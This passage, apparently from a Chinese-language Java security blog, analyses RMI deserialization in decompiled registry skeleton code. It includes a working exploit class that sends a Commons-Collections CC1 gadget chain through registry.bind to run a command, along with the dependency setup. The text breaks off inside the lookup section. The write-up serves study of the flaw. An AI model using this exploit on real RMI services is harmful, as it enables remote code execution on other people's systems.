class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != -<span class="hljs-number">669196253586618813L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DGCImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (DGCImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                ObjID[] var39;<br>                <span class="hljs-type">long</span> var40;<br>                VMID var41;<br>                <span class="hljs-type">boolean</span> var42;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var14</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var39 = (ObjID[])var14.readObject();<br>                    var40 = var14.readLong();<br>                    var41 = (VMID)var14.readObject();<br>                    var42 = var14.readBoolean();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var36) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var36);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var37) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var37);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.clean(var39, var40, var41, var42);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var35) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var35);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                ObjID[] var7;<br>                <span class="hljs-type">long</span> var8;<br>                Lease var10;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (ObjID[])var13.readObject();<br>                    var8 = var13.readLong();<br>                    var10 = (Lease)var13.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var32);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var33) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var33);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Lease</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var6.dirty(var7, var8, var10);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var12.writeObject(var11);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var31) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var31);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4、RMI的几种攻击方式"><a href="#4、RMI的几种攻击方式" class="headerlink" title="4、RMI的几种攻击方式"></a>4、RMI的几种攻击方式</h2><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><h3 id="4-1-攻击注册中心"><a href="#4-1-攻击注册中心" class="headerlink" title="4.1 攻击注册中心"></a>4.1 攻击注册中心</h3><p>攻击点还是在 <font style="color:#080808;background-color:#ffffff;">RegistryImpl_Skel 代码中的反序列化，</font></p><p><font style="color:#080808;background-color:#ffffff;">case 的对应关系如下：</font></p><ul><li><font style="color:#080808;background-color:#ffffff;">case0 – bind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var100 = (String)var105.readObject();<br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case1 – list</font><ul><li><font style="color:#080808;background-color:#ffffff;">list 这里没有 readObject ，无法攻击</font></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>var2.releaseInputStream();<br>String[] var99 = var6.list();<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var102.writeObject(var99);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case2 – lookup</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case3 –  rebind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>Remote var8;<br>String var97;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var97 = (String)var11.readObject();<br>    var8 = (Remote)var11.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.rebind(var97, var8);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case4 – unbind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>String var7;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var7 = (String)var10.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.unbind(var7);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;"></font></p><h4 id="4-1-1-bind-rebind"><a href="#4-1-1-bind-rebind" class="headerlink" title="4.1.1 bind&amp;rebind"></a>4.1.1 bind&amp;rebind</h4><p>调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支，</span><br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//然后进行反序列化</span><br>    <span class="hljs-comment">//第一个对象必须是 String</span><br>    var100 = (String)var105.readObject();<br>    <span class="hljs-comment">//第二个对象被强转为 Remote</span><br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();  <br>        <span class="hljs-comment">//Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用</span><br>        <span class="hljs-comment">//这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));  <br>        <span class="hljs-comment">//向目标 RMI registry 发送请求，触发反序列化</span><br>        registry.bind(<span class="hljs-string">&quot;sTring&quot;</span>,remote);  <br>    &#125;  <br>    <br><span class="hljs-comment">//下面就是以前分析过的 CC1 链 （TransformedMap 版  ）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);  <br>        <span class="hljs-keyword">return</span> o;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>首先导入 commons-collections 3.2.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png"></p><p>rebind  和 bind 一样，不再赘述。</p><h4 id="4-1-2-lookup-unbind"><a href="#4-1-2-lookup-unbind" class="headerlink" title="4.1.2 lookup&amp;unbind"></a>4.1.2 lookup&amp;unbind</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数</span><br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-comment">//这里调用注册表查找对象，返回 Remote 类型并放在 var101</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png"></p><p>lookup 只能传入一个 String 类型</p><p>分析 lookup 的功能，然后伪造 lookup 代码，达到目的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String 